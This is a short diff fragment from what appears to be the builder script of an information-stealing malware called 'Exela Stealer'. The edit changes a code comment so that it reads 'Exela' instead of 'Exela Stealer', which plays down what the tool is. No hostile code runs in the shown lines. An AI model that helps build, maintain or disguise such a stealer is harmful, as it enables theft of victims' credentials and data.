@@ -15,7 +15,7 @@ try:
 except:
     pass
 
-# Class for building the Exela Stealer
+# Class for building the Exela
 class Build:
     def __init__(self) -> None:
         # Initialize various attributes used in the build process
